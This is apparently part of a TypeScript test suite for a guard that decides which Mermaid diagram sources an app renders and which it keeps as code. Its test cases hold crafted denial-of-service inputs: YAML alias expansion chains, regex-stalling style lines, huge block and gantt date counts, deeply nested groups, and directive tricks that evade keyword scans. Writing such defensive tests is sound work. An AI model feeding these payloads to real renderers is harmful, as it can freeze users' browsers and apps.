  test("front matter goes to mermaid when mermaid reads it, and stays code when mermaid would refuse it", async () => {
    const flow = "flowchart LR\n  A --> B";
    const cases: [string, boolean][] = [
      [`---\ntitle: Fluxo\n---\n${flow}`, true],
      [`  ---\n  title: Fluxo\n  ---\n${flow}`, true],
      [`--- \r\ntitle: Fluxo\r\n---\t\r\n${flow}`, true],
      [`---\ntitle: Fluxo\n${flow}`, false],
      [`---\ntitle: Fluxo\n  ---\n${flow}`, false],
      [`---\n---\n${flow}`, false],
      [`---\n${flow}\n---`, false],
    ];
    for (const [source, reads] of cases) {
      expect(mermaidDrawable(source)).toBe(reads);
      expect(Boolean(await mermaid.parse(source, { suppressErrors: true }))).toBe(reads);
    }
  });

  // Safari, Firefox and the desktop app draw on the page's thread. Past the page's bounds each family below held WebKit
  // or Firefox for seconds, and at them mermaid answers in a moment. The limit leaves room for a machine whose cores
  // are all running other test files (1.09 s measured there for a source that takes a fraction of that alone).
  const repeated = (header: string, line: string, count: number) => `${header}\n${Array(count).fill(line).join("\n")}`;
  async function answersQuickly(source: string) {
    expect(mermaidDrawable(source)).toBe(true);
    const start = performance.now();
    expect(await frameScript().ask({ id: "bound", source, dark: false })).toBeDefined();
    expect(performance.now() - start).toBeLessThan(3000);
  }

  test("a source over 5,000 characters or 200 lines stays code, and one at the bounds is answered in a moment", async () => {
    for (const source of [
      `architecture-beta\n  ${"<a\n  ".repeat(4800)}`,
      `pie\n  ${":\n  ".repeat(6000)}`,
      `gitGraph\n  ${":\n  ".repeat(6000)}`,
      `xychart-beta\n${`  ${";".repeat(498)}\n`.repeat(99)}`,
      `flowchart LR\n${"\n".repeat(40_000)}  A --> B`,
      repeated("flowchart LR", `  A[${"x".repeat(452)}] --> B`, 11),
      repeated("flowchart LR", "  A --> B", 200),
    ])
      expect(mermaidDrawable(source)).toBe(false);
    await answersQuickly(repeated("architecture-beta", `  ${"<a".repeat(24)}`, 97));
    await answersQuickly(repeated("architecture-beta", "  <a", 199));
    await answersQuickly(repeated("xychart-beta", `  ${";".repeat(48)}`, 97));
    await answersQuickly(repeated("pie", "  :", 199));
    await answersQuickly(`${repeated("flowchart LR", " ".repeat(499), 9)}\n  A --> B`);
  });

  test("a line over 500 characters, or style lines mermaid's entity regexes take long over, stays code", async () => {
    const styles = `${"style".repeat(25)}${":".repeat(125)}${"#".repeat(240)}`;
    for (const source of [
      `flowchart LR\n  A --> B\n  ${"style:".repeat(1600)}`,
      `flowchart LR\n  A --> B\n  ${"classDef:".repeat(1200)}`,
      `flowchart LR\n  A[${"x".repeat(496)}] --> B`,
      repeated("flowchart LR", `  ${styles}`, 2),
      // Mermaid takes its directives out before its regexes read the lines, which can join two into one.
      `flowchart LR\n  ${"sty%%{x}%%le".repeat(10)}${":".repeat(130)}${"#".repeat(240)}`,
      `flowchart LR\n  ${styles.slice(0, 125)}%%{x\n}%%${styles.slice(125)}`,
      `flowchart LR\n  A[${"x".repeat(480)}%%{x\n}%%${"y".repeat(480)}] --> B`,
    ])
      expect(mermaidDrawable(source)).toBe(false);
    await answersQuickly(repeated("flowchart LR", `  style${":".repeat(165)}${"#".repeat(328)}`, 3));
  });

  test("front matter with a YAML anchor or alias stays code, though mermaid reads it", async () => {
    const flow = "flowchart LR\n  A --> B";
    // Each level repeats the one before ten times: mermaid walks the config as a tree, 13 s in WebKit at 7 levels.
    const chain = (levels: number) => {
      const lines = ["---", `l0: &l0 [${Array(10).fill(1)}]`];
      for (let i = 1; i <= levels; i++) lines.push(`l${i}: &l${i} [${Array(10).fill(`*l${i - 1}`)}]`);
      return [...lines, "config:", `  flowchart: [*l${levels}]`, "---", flow].join("\n");
    };
    for (const source of [
      chain(7),
      chain(1),
      `---\nbase: &b {theme: dark}\nconfig: *b\n---\n${flow}`,
      `---\nconfig: &c\n  theme: dark\n---\n${flow}`,
      `---\n&k title: x\n---\n${flow}`,
    ])
      expect(mermaidDrawable(source)).toBe(false);
    for (const title of ["Q&A", "R & D", "2 * 3", "'*x'", "a&b*c"])
      expect(mermaidDrawable(`---\ntitle: ${title}\n---\n${flow}`)).toBe(true);
    expect(await mermaid.parse(chain(1))).toBeTruthy();
  });

  test("node metadata with a YAML anchor or alias stays code too: a kanban card's held WebKit 56 s", async () => {
    // Each level repeats the one before ten times.
    const levels = [`&l0 [${Array(10).fill(1)}]`];
    for (let i = 1; i < 4; i++) levels.push(`&l${i} [${Array(10).fill(`*l${i - 1}`)}]`);
    const chain = `x: [${levels.join(", ")}], assigned: *l3`;
    for (const source of [
      `kanban\n  todo[A fazer]\n    t1[T]@{ ${chain} }`,
      `kanban\n  todo[A fazer]\n    t1[T]@%%{x}%%{ ${chain} }`,
      // A single-quoted '"' or an escaped \" fences the chain off from a scan that pairs double quotes first; the raw
      // scan still sees the anchors mermaid expands.
      `kanban\n  todo[A fazer]\n    t1[T]@{ q: '"', ${chain}, r: '"' }`,
      `kanban\n  todo[A fazer]\n    t1[T]@{ q: "\\"", ${chain}, r: "\\"" }`,
      `flowchart LR\n  A@{ label: "a } b", ${chain} }`,
      `flowchart LR\n  A@{\n    shape: rect\n    label: *l0\n  }`,
      `flowchart LR\n  A e1@--> B\n  e1@{ animation: *a }`,
      `sequenceDiagram\n  participant A@{ "type": "actor", "alias": *a }`,
    ])
      expect(mermaidDrawable(source)).toBe(false);
    for (const label of ["Q&A", "R & D", "2 * 3", "*negrito*", "a&b*c"])
      expect(mermaidDrawable(`flowchart LR\n  A@{ shape: rect, label: "${label}" } --> B`)).toBe(true);
    expect(mermaidDrawable("kanban\n  todo[A fazer]\n    t1[Q&A]@{ assigned: 'Ana & Bia', priority: 'High' }")).toBe(
      true,
    );
    expect((await mermaid.parse(`kanban\n  todo[A fazer]\n    t1[T]@{ x: [&a 1], assigned: *a }`))?.diagramType).toBe(
      "kanban",
    );
    // Mermaid expands the alias behind the quoted '"', so the chain is real work, not drawable text.
    expect(
      (await mermaid.parse(`kanban\n  todo[A fazer]\n    t1[T]@{ q: '"', x: [&a 1], assigned: *a, r: '"' }`))
        ?.diagramType,
    ).toBe("kanban");
  });

  test("where a number sets mermaid's work, not the source's length, past a few the fence stays code", async () => {
    const gantt = (excludes: string, tasks: string[], format = "YYYY-MM-DD") =>
      `gantt\n  dateFormat ${format}\n  excludes ${excludes}\n${tasks.map((t, i) => `  t${i} :${t}`).join("\n")}`;
    const nested = (levels: number, after = "") =>
      `architecture-beta\n  group g0(cloud)[G0]\n${Array.from(
        { length: levels - 1 },
        (_, i) => `  group g${i + 1}(cloud)[G${i + 1}] in g${i}${after}`,
      ).join("\n")}\n  service s(server)[S] in g${levels - 1}`;
    for (const source of [
      // `space:N` is N blocks: `space:100000` held WebKit 77 s.
      "block-beta\n  space:101",
      "block-beta\n  space:100000",
      "block-beta\n  columns 3\n  space:60\n  a\n  space:60",
      // Excluded dates make mermaid walk each task day by day: 1,000,000 days held WebKit 3.6 s.
      gantt("1999-01-01", ["2024-01-01, 1000000d"]),
      gantt("weekends", ["2024-01-01, 30y"]),
      gantt("weekends", Array(30).fill("2024-01-01, 400d")),
      gantt("weekends", ["01-01-2024, 31-12-2999"], "DD-MM-YYYY"),
      gantt("weekends", ["2024-01-01, 3d", "2999-01-01, 3d", "until t1"]),
      gantt("weekends", ["1700000000, 1d"], "X"),
      // Mermaid matches `excludes` case-insensitively and at any token start, not only lowercase at a line's start.
      "gantt\n  dateFormat YYYY-MM-DD\n  Excludes 1999-01-01\n  t :2024-01-01, 1000000d",
      "gantt excludes 1999-01-01\n  t :2024-01-01, 1000000d",
      // A task `until` a missing id ends today, a year the source never names, so each of these walks ~1,000 years.
      `gantt\n  dateFormat YYYY-MM-DD\n  excludes nada\n${Array.from({ length: 4 }, (_, i) => `  t${i} :1000-01-01, until nada`).join("\n")}`,
      // Groups 4 levels deep with edges across them held Chrome's frame 13 s, and 10 levels WebKit 25 s.
      nested(4),
      nested(4, " %% sub"),
      "architecture-beta\n  group a[A] in b\n  group b[B] in a\n  service s in a",
    ])
      expect(mermaidDrawable(source)).toBe(false);
    for (const source of [
      "block-beta\n  columns 3\n  a space:2 b\n  space c:2",
      gantt("weekends", ["2024-01-01, 30d", "2024-02-01, 2w", "2024-03-01, 1M"]),
      "gantt\n  dateFormat YYYY-MM-DD\n  t :2024-01-01, 1000000d",
      nested(3),
      "architecture-beta\n  group g0(cloud)[Data in g1]\n  group g1(cloud)[G1] in g0\n  service s(server)[S] in g1",
    ])
      expect(mermaidDrawable(source)).toBe(true);
    await answersQuickly(`block-beta\n  columns 10\n${"  space:10\n".repeat(10)}`);
    await answersQuickly(gantt("weekends", Array(10).fill("2024-01-01, 1000d")));
  });

  test("a block diagram nested over 10 levels stays code; one 10 deep draws in a moment", async () => {
    const blockNested = (levels: number) =>
      `block-beta\n${Array.from({ length: levels }, (_, i) => `${" ".repeat(Math.min(i, 30) + 2)}block:g${i}`).join(
        "\n",
      )}\n  a b\n${Array.from({ length: levels }, () => "  end").join("\n")}`;
    for (const levels of [11, 25]) expect(mermaidDrawable(blockNested(levels))).toBe(false);
    expect(mermaidDrawable(blockNested(10))).toBe(true);
    await answersQuickly(blockNested(10));
  });

  test("a mindmap over 100 lines or a venn diagram over 30 sets and unions stays code, its keyword split or not", async () => {
    const mindmap = (header: string, nodes: number) =>
      `${header}\n  root\n${Array.from({ length: nodes }, (_, i) => `    c${i}`).join("\n")}`;
    const venn = (header: string, sets: number, before = "") =>
      `${header}\n${Array.from({ length: sets }, (_, i) => `  ${before}set S${i}`).join("\n")}`;
    for (const source of [
      mindmap("mindmap", 99),
      mindmap("mind%%{x}%%map", 99),
      venn("venn-beta", 31),
      venn("venn%%{x}%%-beta", 31),
      venn("venn-beta", 31, "%%{x}%%"),
      `${venn("venn-beta", 20)}\n${Array.from({ length: 11 }, (_, i) => `  union S${i},S${i + 1}`).join("\n")}`,
    ])
      expect(mermaidDrawable(source)).toBe(false);
    expect(mermaidDrawable(mindmap("mindmap", 98))).toBe(true);
    // Mermaid finds the keyword once its directives are out.
    expect((await mermaid.parse(mindmap("mind%%{x}%%map", 3)))?.diagramType).toBe("mindmap");
    expect((await mermaid.parse(venn("venn%%{x}%%-beta", 3)))?.diagramType).toBe("venn");
    await answersQuickly(venn("venn-beta", 30));
  });

  test("a gantt is drawn 720px wide, which a card fits, not as wide as the frame", async () => {
    const frame = frameScript();
    const gantt = "gantt\n  dateFormat YYYY-MM-DD\n  section Entrega\n  Build :a1, 2024-01-01, 3d";
    const drawn = (await frame.ask({ id: "g", source: gantt, dark: false })) as { svg: string };
    expect(svgDrawing(drawn.svg)?.width).toBe(720);
  });
});
